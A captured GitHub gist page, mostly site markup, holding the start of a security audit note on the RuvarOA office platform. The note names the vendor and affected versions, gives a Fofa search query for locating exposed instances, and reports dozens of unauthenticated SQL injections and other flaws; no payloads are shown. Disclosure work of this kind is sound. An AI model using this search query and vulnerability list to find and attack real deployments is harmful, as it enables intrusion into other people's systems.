</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>

</div>
    </li>
    <li>
        <button href="https://desktop.github.com" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="93d3c46e8b317c0e9c202e4495c18ac6e746f06d135cd0d8cf45fa65b7f4dab7" data-platforms="windows,mac" id="icon-button-0cb24bc4-56c3-4d15-ac71-bb66a8871919" aria-labelledby="tooltip-64174602-fb00-4f65-b1d1-6d5d7206b4bb" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small js-remove-unless-platform">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-desktop-download Button-visual">
    <path d="m4.927 5.427 2.896 2.896a.25.25 0 0 0 .354 0l2.896-2.896A.25.25 0 0 0 10.896 5H8.75V.75a.75.75 0 1 0-1.5 0V5H5.104a.25.25 0 0 0-.177.427Z"></path><path d="M1.573 2.573a.25.25 0 0 0-.073.177v7.5a.25.25 0 0 0 .25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25h-3a.75.75 0 1 1 0-1.5h3A1.75 1.75 0 0 1 16 2.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.75.75 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5A1.75 1.75 0 0 1 1.75 1h3a.75.75 0 0 1 0 1.5h-3a.25.25 0 0 0-.177.073ZM6.982 12a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5H6.982Z"></path>
</svg>
</button><tool-tip id="tooltip-64174602-fb00-4f65-b1d1-6d5d7206b4bb" for="icon-button-0cb24bc4-56c3-4d15-ac71-bb66a8871919" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Save Mr-xn/bc8261a5c3e35a72768723acf1da358d to your computer and use it in GitHub Desktop.</tool-tip>


    </li>
  </ul>

<div class="d-flex flex-md-row flex-column px-0 pr-md-3 px-lg-5">
  <div class="flex-md-order-1 flex-order-2 flex-auto">
    <nav class="UnderlineNav box-shadow-none px-3 px-lg-0"
     aria-label="Gist"
     data-pjax="#gist-pjax-container">

  <div class="UnderlineNav-body">
    <a class="js-selected-navigation-item selected UnderlineNav-item" data-pjax="true" data-hotkey="g c" aria-current="page" data-selected-links="gist_code /Mr-xn/bc8261a5c3e35a72768723acf1da358d" href="/Mr-xn/bc8261a5c3e35a72768723acf1da358d">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code UnderlineNav-octicon">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      Code
</a>
      <a class="js-selected-navigation-item UnderlineNav-item" data-pjax="true" data-hotkey="g r" data-selected-links="gist_revisions /Mr-xn/bc8261a5c3e35a72768723acf1da358d/revisions" href="/Mr-xn/bc8261a5c3e35a72768723acf1da358d/revisions">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-commit UnderlineNav-octicon">
    <path d="M11.93 8.5a4.002 4.002 0 0 1-7.86 0H.75a.75.75 0 0 1 0-1.5h3.32a4.002 4.002 0 0 1 7.86 0h3.32a.75.75 0 0 1 0 1.5Zm-1.43-.75a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z"></path>
</svg>
        Revisions
        <span title="1" data-view-component="true" class="Counter">1</span>
</a>

  </div>
</nav>

  </div>

  <div class="d-md-flex d-none flex-items-center flex-md-order-2 flex-order-1" data-multiple>
    
<div data-view-component="true" class="flex-items-center d-inline-flex">
  <action-menu data-menu-input="gist-share-url-original" data-select-variant="single" data-dynamic-label="" data-view-component="true" class="flex-shrink-0">
  <focus-group direction="vertical" mnemonics retain>
    <button id="action-menu-b7d45782-4616-4f94-9312-cd566d9267d4-button" popovertarget="action-menu-b7d45782-4616-4f94-9312-cd566d9267d4-overlay" aria-controls="action-menu-b7d45782-4616-4f94-9312-cd566d9267d4-list" aria-haspopup="true" type="button" data-view-component="true" class="rounded-right-0 border-right-0 Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Embed</span>
  </span>
    <span class="Button-visual Button-trailingAction">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
    </span>
</button>


<anchored-position data-target="action-menu.overlay" id="action-menu-b7d45782-4616-4f94-9312-cd566d9267d4-overlay" anchor="action-menu-b7d45782-4616-4f94-9312-cd566d9267d4-button" align="start" side="outside-bottom" anchor-offset="normal" popover="auto" data-view-component="true">
  <div data-view-component="true" class="Overlay Overlay--size-auto">
    
      <div data-view-component="true" class="Overlay-body Overlay-body--paddingNone">          <action-list>
  <div data-view-component="true">
    <ul aria-labelledby="action-menu-b7d45782-4616-4f94-9312-cd566d9267d4-button" id="action-menu-b7d45782-4616-4f94-9312-cd566d9267d4-list" role="menu" data-view-component="true" class="ActionListWrap--inset ActionListWrap">
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="&lt;script src=&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&quot;&gt;&lt;/script&gt;" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;EMBED&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="1639717bb1bfc852314837a07b5082eeb9141eff8d55206d791cd6cdd0973536" id="item-3bc80c86-ecb6-433e-bf3d-c0fbb85ae1bd" type="button" role="menuitemradio" aria-checked="true" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Embed
</span>      <span data-view-component="true" class="ActionListItem-description">Embed this gist in your website.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;SHARE&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="213a082e4e385c5f692afe18a83edcd9fe46fd0f109bd04a559867a0896f48e0" id="item-e96cb49c-06a2-4d05-bfc0-87c04657bb32" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
           Share
</span>      <span data-view-component="true" class="ActionListItem-description">Copy sharable link for this gist.</span>
</span></button>
  
</li>
        <li data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <button value="https://gist.github.com/bc8261a5c3e35a72768723acf1da358d.git" tabindex="-1" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;USE_HTTPS&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="abb858226e767e1659ca31b793fc15aa85dd571c45e30542ecb7a26d6ed4c745" id="item-c9394785-0d61-4ed6-b800-cae7c17cb5d9" type="button" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
      <span data-view-component="true" class="ActionListItem-descriptionWrap">
        <span data-view-component="true" class="ActionListItem-label">
          Clone via HTTPS
</span>      <span data-view-component="true" class="ActionListItem-description">Clone using the web URL.</span>
</span></button>
  
</li>
        <li role="presentation" aria-hidden="true" data-view-component="true" class="ActionList-sectionDivider"></li>
        <li target="_blank" rel="noopener noreferrer" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-75a4ac93-0797-4c07-b6b3-45a050b813b7" href="https://docs.github.com/articles/which-remote-url-should-i-use" role="menuitemradio" aria-checked="false" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-action--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check ActionListItem-singleSelectCheckmark">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
        </span>
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-question">
    <path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.92 6.085h.001a.749.749 0 1 1-1.342-.67c.169-.339.436-.701.849-.977C6.845 4.16 7.369 4 8 4a2.756 2.756 0 0 1 1.637.525c.503.377.863.965.863 1.725 0 .448-.115.83-.329 1.15-.205.307-.47.513-.692.662-.109.072-.22.138-.313.195l-.006.004a6.24 6.24 0 0 0-.26.16.952.952 0 0 0-.276.245.75.75 0 0 1-1.248-.832c.184-.264.42-.489.692-.661.103-.067.207-.132.313-.195l.007-.004c.1-.061.182-.11.258-.161a.969.969 0 0 0 .277-.245C8.96 6.514 9 6.427 9 6.25a.612.612 0 0 0-.262-.525A1.27 1.27 0 0 0 8 5.5c-.369 0-.595.09-.74.187a1.01 1.01 0 0 0-.34.398ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
                Learn more about clone URLs

</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu>    <primer-text-field class="FormControl width-full FormControl--fullWidth">
      <label for="gist-share-url-original" class="sr-only FormControl-label">
        Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
</label>    
  <div class="FormControl-input-wrap FormControl-input-wrap--small">
    
      <input id="gist-share-url-original" aria-label="Clone this repository at &amp;lt;script src=&amp;quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;" value="&lt;script src=&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d.js&quot;&gt;&lt;/script&gt;" readonly="readonly" data-autoselect="true" data-target="primer-text-field.inputElement " aria-describedby="validation-3954b196-5688-424f-85a0-822d1fe38ec8" class="form-control FormControl-monospace FormControl-input FormControl-small rounded-left-0 rounded-right-0 border-right-0" type="text" name="gist-share-url-original" />
</div>
      <div class="FormControl-inlineValidation" id="validation-3954b196-5688-424f-85a0-822d1fe38ec8" hidden="hidden">
  <span class="FormControl-inlineValidation--visual" data-target="primer-text-field.validationSuccessIcon" hidden><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-check-circle-fill">
    <path d="M6 0a6 6 0 1 1 0 12A6 6 0 0 1 6 0Zm-.705 8.737L9.63 4.403 8.392 3.166 5.295 6.263l-1.7-1.702L2.356 5.8l2.938 2.938Z"></path>
</svg></span>
  <span class=" FormControl-inlineValidation--visual" data-target="primer-text-field.validationErrorIcon"><svg aria-hidden="true" height="12" viewBox="0 0 12 12" version="1.1" width="12" data-view-component="true" class="octicon octicon-alert-fill">
    <path d="M4.855.708c.5-.896 1.79-.896 2.29 0l4.675 8.351a1.312 1.312 0 0 1-1.146 1.954H1.33A1.313 1.313 0 0 1 .183 9.058ZM7 7V3H5v4Zm-1 3a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z"></path>
</svg></span>
  <span></span>
</div>
    
</primer-text-field>
  <span data-view-component="true">
  <clipboard-copy id="clipboard-button" aria-label="Copy" for="gist-share-url-original" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;COPY_URL&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="a2023b04695ea1f64f299d229335f4e15b11a61e1116a39e5b6832c0d428b745" type="button" data-view-component="true" class="rounded-left-0 Button--secondary Button--small Button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg style="display: none;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check color-fg-success">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>

</div>

    <div class="ml-2">
        <button href="https://desktop.github.com" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;OPEN_IN_DESKTOP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="93d3c46e8b317c0e9c202e4495c18ac6e746f06d135cd0d8cf45fa65b7f4dab7" data-platforms="windows,mac" id="icon-button-c834b60c-0027-4f8c-b1af-78e5b81d9078" aria-labelledby="tooltip-17d72213-2446-4bb7-ab18-fe401f83ac87" type="button" data-view-component="true" class="Button Button--iconOnly Button--secondary Button--small js-remove-unless-platform">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-desktop-download Button-visual">
    <path d="m4.927 5.427 2.896 2.896a.25.25 0 0 0 .354 0l2.896-2.896A.25.25 0 0 0 10.896 5H8.75V.75a.75.75 0 1 0-1.5 0V5H5.104a.25.25 0 0 0-.177.427Z"></path><path d="M1.573 2.573a.25.25 0 0 0-.073.177v7.5a.25.25 0 0 0 .25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25h-3a.75.75 0 1 1 0-1.5h3A1.75 1.75 0 0 1 16 2.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.75.75 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.192-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5A1.75 1.75 0 0 1 1.75 1h3a.75.75 0 0 1 0 1.5h-3a.25.25 0 0 0-.177.073ZM6.982 12a5.72 5.72 0 0 1-.765 2.5h3.566a5.72 5.72 0 0 1-.765-2.5H6.982Z"></path>
</svg>
</button><tool-tip id="tooltip-17d72213-2446-4bb7-ab18-fe401f83ac87" for="icon-button-c834b60c-0027-4f8c-b1af-78e5b81d9078" popover="manual" data-direction="s" data-type="label" data-view-component="true" class="sr-only position-absolute">Save Mr-xn/bc8261a5c3e35a72768723acf1da358d to your computer and use it in GitHub Desktop.</tool-tip>


    </div>

    <div class="ml-2">
      <a class="btn btn-sm" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;clone_or_download.click&quot;,&quot;payload&quot;:{&quot;feature_clicked&quot;:&quot;DOWNLOAD_ZIP&quot;,&quot;git_repository_type&quot;:&quot;GIST&quot;,&quot;gist_id&quot;:128145818,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="c860a5e66e6cff4aac7429af6afe9a992f7e0e109fcd9335f55df7d47de9bd99" data-ga-click="Gist, download zip, location:gist overview" href="/Mr-xn/bc8261a5c3e35a72768723acf1da358d/archive/860fbf68a1fdf4e26aca4ac598f4996e0a180caf.zip">Download ZIP</a>
    </div>
  </div>
</div>


  </div>
</div>

<div class="container-lg px-3">
  <div class="repository-content gist-content" >
    
  <div>
      <div itemprop="about">
    RuvarOA code review notes
  </div>

        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-ruvaroa-md" class="file my-2">
      <div class="file-header d-flex flex-md-items-center flex-items-start">
        <div class="file-actions flex-order-2 pt-0">
          <a href="/Mr-xn/bc8261a5c3e35a72768723acf1da358d/raw/860fbf68a1fdf4e26aca4ac598f4996e0a180caf/RuvarOA.md" data-view-component="true" class="Button--secondary Button--small Button">  <span class="Button-content">
    <span class="Button-label">Raw</span>
  </span>
</a>

        </div>
        <div class="file-info pr-4 d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
          <span class="mr-1">
            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-square color-fg-muted">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25Zm7.47 3.97a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L10.69 8 9.22 6.53a.75.75 0 0 1 0-1.06ZM6.78 6.53 5.31 8l1.47 1.47a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215l-2-2a.75.75 0 0 1 0-1.06l2-2a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
          </span>
          <a class="wb-break-all" href="#file-ruvaroa-md">
            <strong class="user-select-contain gist-blob-name css-truncate-target">
              RuvarOA.md
            </strong>
          </a>
        </div>
      </div>
      <div id="file-ruvaroa-md-readme" class="Box-body readme blob p-5 p-xl-6 gist-border-0">
    <article class="markdown-body entry-content container-lg" itemprop="text"><div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">Vendor</h1><a id="user-content-vendor" class="anchor" aria-label="Permalink: Vendor" href="#vendor"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">Guangzhou Luhua Information Technology Co., Ltd.</p>
<div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">HomePage</h1><a id="user-content-homepage" class="anchor" aria-label="Permalink: HomePage" href="#homepage"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="http://www.ruvar.net" rel="nofollow">http://www.ruvar.net</a> | <a href="http://m.ruvar.com/" rel="nofollow">http://m.ruvar.com/</a></p>
<div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">Fofa Query</h1><a id="user-content-fofa-query" class="anchor" aria-label="Permalink: Fofa Query" href="#fofa-query"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">app="RUVAROA-Cooperative-Office-Platform" <a href="https://en.fofa.info/result?qbase64=YXBwPSJSVVZBUk9BLUNvb3BlcmF0aXZlLU9mZmljZS1QbGF0Zm9ybSI%3D" rel="nofollow">link</a></p>
<div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">Products Affected</h1><a id="user-content-products-affected" class="anchor" aria-label="Permalink: Products Affected" href="#products-affected"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">RuvarOA V6.01 、RuvarOA V12.01</p>
<div class="markdown-heading" dir="auto"><h1 class="heading-element" dir="auto">Description</h1><a id="user-content-description" class="anchor" aria-label="Permalink: Description" href="#description"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">During the code audit of the RuvarOA system, I discovered multiple vulnerabilities.
Including dozens of SQL injection vulnerabilities (unauthorized in the frontend), multiple unauthorized access vulnerabilities, multiple XSS vulnerabilities, several sensitive information disclosure vulnerabilities, and one system design flaw vulnerability.</p>
